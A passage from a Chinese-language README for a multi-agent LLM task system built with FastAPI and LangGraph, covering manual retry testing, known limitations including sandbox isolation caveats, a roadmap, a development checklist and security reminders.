> CI 里只跑 `manager,e2e`，`checker` 留给配了 Key 的本地环境手动执行。

### 手动验证「打回重做」

```bash
# 让 Checker 第一次故意判不通过
MOCK_CHECKER_FAIL_TIMES=1 python tools/run_task.py "验证重试"
# Windows PowerShell: $env:MOCK_CHECKER_FAIL_TIMES="1"; python tools\run_task.py "验证重试"
```

预期日志出现「未通过（第 1 次），打回 Worker 重做」，随后重新执行并通过，`尝试次数 = 2`。

把该值设为大于 `MAX_RETRY_PER_SUBTASK`，可验证「超过重试上限」：子任务标记未通过，最终 `status = partial`，任务整体不失败。

## 已知限制

这个项目是一个**轻量实现**，适合学习、二次开发和中小型文本任务。它不是生产级系统，以下差距是明确的：

**P0**

- ~~没有检索质量评测集~~ —— 已补：20 条人工标注 + `run_eval.py --suite retrieval`，输出 Hit@1/@3/@5 与 MRR（样本量仍偏小，可继续扩）
- ~~`deps` 尚未参与调度~~ —— 已补：`graph/scheduler.py` 按就绪集调度并同层并行；剩余可做的是「失败后只重跑受影响的下游」
- ~~**Worker 没有工具**~~、~~**没有 Coder / Tester**~~ —— 都已补：Worker 能读写工作区、
  执行 `.py` 与 pytest；代码子任务走「Tester 出题 → Coder 跑到通过」的独立链路。
  仍缺：只支持 Python（没有跨语言）、沙箱内不联网因此**不能装依赖**、
  没有多文件工程的构建体系（`make` / `npm install` 这类）
- 语料仅 20 篇自建文档（51 chunk），没有来源可信度标注
- 测试覆盖了核心算法、端到端链路、可观测性、鉴权限流与 HTTP 接口层（49 用例），
  但 **Checker 的验收准确率仍没有自动化门槛**——它依赖真实模型，CI 里跑不了，
  只能本地手动执行 `evals/run_eval.py --suite checker`

**P1**

- ~~无 metrics / traceId~~ —— 已补齐：`thread_id` 贯穿日志、`/metrics` 暴露指标、token 随任务结果返回
- ~~SSE 不支持断线续传与心跳~~ —— 已补：后台执行 + 事件缓冲 + `Last-Event-ID` 续传 + 15s 心跳
- **事件缓冲与限流都是单进程内存实现**，多副本部署需要换成 Redis（事件总线 / 计数器）；也没有任务级资源隔离（并发任务数、单任务时长均无上限）
- 事件缓冲只保留最近 50 次执行，更早的会被淘汰 —— 断线太久再重连可能发现缓冲已不在（此时仍可用 `/task/{thread_id}/state` 查最终状态）
- 事件缓冲本身仍是**进程内存**实现：限流已经支持 Redis 后端，但事件缓冲没有 ——
  多副本部署时同一个 thread 的重连可能落到另一个副本上，拿不到缓冲（要做需要把事件流放进 Redis Stream 或消息队列）
- **默认沙箱后端不是隔离**：`subprocess` 与宿主同用户、能读文件系统、能联网，
  只适合执行 Agent 自己写出来的代码。要跑不可信输入，必须切 `SANDBOX_BACKEND=docker`
  （已内置 `--network=none` 与内存/PID 上限），或把整个服务放进容器 / 虚拟机
- 长文本在整个链路里是原文透传，未做摘要压缩，长任务上下文会膨胀
- token 预算是「调用前熔断」：只能判断当前累计是否超限，无法预估本次调用将要消耗多少

**P2**

- Manager 拆解时未引入历史对话，不支持多轮澄清
- 没有 human-in-the-loop 节点，验收失败时无法人工介入决策

**P3**

- 无 Web 前端，节点流转只能通过 SSE 或日志观察
- 失败任务不支持单个子任务重跑

## 路线图

已完成的能力补强（其中前四项是基建，后两项是功能）：

- [x] **可观测性** —— `thread_id` 贯穿日志、可选 JSON 结构化输出、`/metrics` 指标
- [x] **LLM 可靠性与成本** —— 指数退避重试、总时间预算、多模型回退、token 计量与预算熔断
- [x] **安全** —— 可选 API Key 鉴权、滑动窗口限流（默认关闭，保持开箱即用）
- [x] **离线评估框架** —— 拆解质量 / 验收准确率 / 检索质量 / 端到端，接入 CI
- [x] **DAG 调度** —— `deps` 真正参与决策，同层子任务并行执行
- [x] **SSE 断线续传** —— 后台执行 + 事件缓冲 + `Last-Event-ID` + 心跳
- [x] **可插拔 Rerank** —— 启发式 / Cross-Encoder / LLM，任一档故障自动降级
- [x] **受控工具层** —— 工作区路径隔离 + 白名单文件工具 + ReAct 调用循环
- [x] **Coder / Tester** —— Tester 出题、Coder 跑到 pytest 变绿，验收依据是真退出码
- [x] **代码沙箱** —— 环境变量清洗 / 超时杀整个进程组 / 输出截断，docker 后端可选

按**性价比**排序（先做「能度量」，再做「能执行」）：

| 优先级 | 事项 | 说明 |
| --- | --- | --- |
| ✅ | ~~检索评测集~~ | 已完成：20 条人工标注 + Hit@1 / Hit@3 / MRR，已接入 CI（可继续扩样本量） |
| ✅ | ~~DAG 调度~~ | 已完成：就绪集调度 + 同层并行执行 |
| ✅ | ~~Rerank~~ | 已完成：可插拔三档，默认启发式（零依赖），Hit@3 65% → 80% |
| ✅ | ~~工具层~~ | 已完成：受控工作区 + 白名单文件工具 + ReAct 循环 |
| ✅ | ~~Coder / Tester~~ | 已完成：独立出题 + 跑到 pytest 变绿；沙箱提供 subprocess / docker 双后端 |
| **1** | **跨语言与依赖安装** | 目前只支持 Python，且沙箱内不联网因而装不了依赖。要做得靠镜像预置依赖 + 按语言切换执行器（`node` / `go` / `java`） |
| **3** | **层级切分 + AutoMerging** | 面向结构化的真实领域语料（父 / 子两级切分、命中叶节点后向上合并）；语料规模上来之后才划算 |
| **4** | **上下文压缩** | 长输出摘要后再传给下游，缓解长任务的上下文膨胀与成本上涨 |

> 顺序说明：跳过度量直接堆功能，会陷入「无法判断改动好坏」的困境。

上表是**概览**。每条能力的具体验收标准、分阶段实施计划、以及「哪些事不要做」的硬性约束，见 **[`docs/TARGET.md`](docs/TARGET.md)**。

## 开发进度

- [x] FastAPI 项目初始化 + LangGraph 状态机骨架 + 接 DeepSeek
- [x] 三个 Agent：Manager 拆任务出 JSON、Worker 执行、Checker 验收
- [x] 混合检索：文档加载切分 + BM25/向量/RRF
- [x] SQLite checkpoint 断点续跑
- [x] SSE 流式输出 + Docker Compose 部署
- [x] 工程化：回归用例 + GitHub Actions CI + MIT LICENSE
- [x] 可观测性：`thread_id` 上下文 + 可选 JSON 日志 + `/metrics` 指标
- [x] LLM 可靠性：指数退避重试 + 总时间预算 + 多模型回退 + token 计量与预算熔断
- [x] 安全：可选 API Key 鉴权 + 内存滑动窗口限流（默认关闭）
- [x] 离线评估框架：拆解质量 / 验收准确率 / 端到端，接入 CI
- [x] 测试扩充到 76 个用例（可观测性 / 鉴权限流 / LLM 可靠性 / HTTP 契约 / 调度并行 / 断线续传）
- [x] SSE 断线续传：后台线程执行 + 事件缓冲 + `Last-Event-ID` 续传 + 15s 心跳
- [x] 可插拔 Rerank：启发式（零依赖）/ Cross-Encoder / LLM 打分三档，Hit@3 65% → 80%
- [x] 受控工具层：工作区路径校验四道关 + 白名单文件工具 + Worker ReAct 调用循环
- [x] Coder / Tester 双角色：Tester 独立出题、Coder 跑到 pytest 变绿（实测产出 15 个用例全过）
- [x] 代码执行沙箱：环境变量清洗 + 超时杀进程组 + 输出截断，Docker 后端可选
- [x] 测试扩充到 149 个用例（新增沙箱 20 项 / 编码链路 7 项）
- [x] 限流支持 Redis 后端（多副本共享配额），连不上自动降级为进程内限流
- [x] 测试扩充到 122 个用例（新增路径安全 / 工具层 / 重排）
- [x] DAG 调度：`deps` 真正参与决策，同层子任务并行执行（并发上限可配）
- [x] 检索质量评测集：20 条口语化标注 + Hit@1/@3/@MRR，接入 CI
- [x] 修复「打回意见从未真正传回 Worker」的缺陷（改由 `last_rejection` 显式携带）

## 安全提醒

- `.env` 已在 `.gitignore` 与 `.dockerignore` 中排除，**不会被提交或打进镜像**
- 如果曾经误提交过真实 Key，请立刻去服务商后台轮换——git 历史里的密钥即使删除文件也依然可被检出
- 生产环境请把 `CORS_ORIGINS` 从 `*` 改成具体域名

## License

[MIT](LICENSE) © 2026 ydh9851
